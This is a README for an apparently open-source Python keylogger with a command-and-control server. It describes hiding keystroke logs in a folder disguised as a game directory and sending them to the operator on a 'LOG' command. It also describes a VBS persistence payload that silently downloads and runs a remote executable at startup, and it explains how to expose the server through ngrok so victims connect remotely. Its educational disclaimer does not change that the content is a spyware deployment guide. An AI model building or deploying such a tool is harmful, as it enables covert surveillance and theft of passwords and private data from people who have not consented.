# Keylogger and Server Communication

This project consists of two Python scripts: `client.py` and `server.py`. The client script logs key presses to a local file and communicates with a server to send the log data. The server script listens for incoming client connections, allows the server operator to interact with connected clients, and sends commands to them.

## Files

### `client.py`

The `client.py` script performs the following tasks:

- Logs key presses to a file located at `AppData/Roaming/RiotGames/log.txt`.
- Hides the log file for security purposes.
- Establishes a socket connection to a server.
- Waits for server commands and performs actions based on those commands:
  - `LOG`: Sends the content of the log file to the server.
  - `exit`: Closes the connection to the server.

### `server.py`

The `server.py` script performs the following tasks:

- Listens for incoming client connections
- Maintains a list of active client connections.
- Displays a list of active clients and allows the server operator to:
  - Select a client by number.
  - Send commands to the selected client.
  - Close the connection with the client.

### `Startup Persistence with VBS`
To ensure the keylogger runs automatically on system startup, a Visual Basic Script (VBS) payload is provided. This script:

Creates a shortcut (MyApp.lnk) in the user's Startup folder that runs silently using wscript.exe.

The shortcut points to a hidden test.vbs file in %APPDATA%\Roaming\, which:

Downloads a remote executable (test.exe) using curl.

Saves and executes the file from the temporary directory.

The process is fully hidden from the user (no visible windows).

Automatically recreates required folders and files if they do not exist.

This script establishes persistence and executes remote code, which can be highly malicious in nature. It should only be used for educational, ethical, and authorized security testing.


## Requirements

- Python 3.x
- External Libraries:
  - `keyboard` (Install with `pip install keyboard`)

## Usage

### Running the Server

1. Start the server by running `server.py`.
2. The server will listen for incoming connections from clients.
3. Once a client connects, the server operator can interact with the client by selecting it from the list of active clients and sending commands.

#### Hosting with ngrok (Optional)

You can use **ngrok** to easily expose your local server to the internet. Follow these steps to use ngrok:

1. **Download and install ngrok**:

   - Go to [ngrok.com](https://ngrok.com/) and sign up for a free account.
   - Download the appropriate version for your operating system and extract the file.

2. **Start the server**:

   - Run the `server.py` script to start your server.

3. **Expose the local server using ngrok**:

   - Open a terminal or command prompt and navigate to the directory where `ngrok` is installed.
   - Run the following command to expose your local server on port `65432` (or the port your server is using):
     ```bash
     ngrok tcp 65432
     ```

4. **Get the ngrok address**:

   - After running the command, ngrok will display a forwarding address like `tcp://0.tcp.ngrok.io:XXXXX`, where `XXXXX` is a randomly assigned port number. This is the address you will use for the client to connect remotely.

5. **Update the client configuration**:

   - In the `client.py` script, update the server address to the one provided by ngrok. For example:
     ```python
     HOST = "0.tcp.ngrok.io"  # Replace with your ngrok address
     PORT = XXXXX  # Replace with the ngrok port number
     ```

6. **Provide the ngrok address**:

   - Share the ngrok address (`0.tcp.ngrok.io:XXXXX`) with the client, so it can connect to your server remotely.

### Running the Client

1. **Start the client**:

   - Run the `client.py` script to start the client.

2. **Connect the client to the server**:

   - The client will attempt to connect to the server. By default, the server is set to "" on port `xxxxx`. However, if you're using ngrok, you need to replace this with the address provided by ngrok (e.g., `0.tcp.ngrok.io:XXXXX`).

3. **Logging and sending data**:

   - The client will log key presses to a file located at `AppData/Roaming/RiotGames/log.txt`. When prompted, the client will send the log file to the server.

### Available Commands

#### Client Commands:

- **LOG**: Sends the content of the `log.txt` file to the server.
- **exit**: Closes the connection to the server.

## Notes

- Ensure that the server and client are using the correct IP addresses and port numbers.
- The client attempts to reconnect every 10 seconds if it fails to connect to the server.
- The log file is hidden using the `attrib +h` command to avoid easy access.

## Security Disclaimer

This project is intended for educational purposes only. Unauthorized use of keylogging and network monitoring can violate privacy and legal standards. Always obtain proper consent before deploying or using such tools.

## License

This project is open source under the MIT License.
